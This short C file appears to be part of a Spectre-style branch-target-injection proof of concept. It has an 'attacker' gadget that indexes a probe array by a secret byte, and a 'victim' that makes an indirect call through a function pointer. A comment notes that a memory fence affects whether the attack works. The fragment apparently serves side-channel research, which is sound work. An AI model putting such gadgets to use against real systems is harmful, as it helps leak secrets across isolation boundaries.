#include "btb.h"

int (*fp1)(char *info);
int (**fp2)(char *info);

int attacker(char *info){
    return oracle_block[*info * PAGESIZE];
}

int safe(){
    return 42;
}

int victim(char *info, int input){
    static int result;
    for (int i =0; i < 100; i++){
        input += i;
        junk += input & i;
    }
    //_mm_mfence(); // removing the fence breaks attack???
    result = (*fp2)(info);

    return result;
}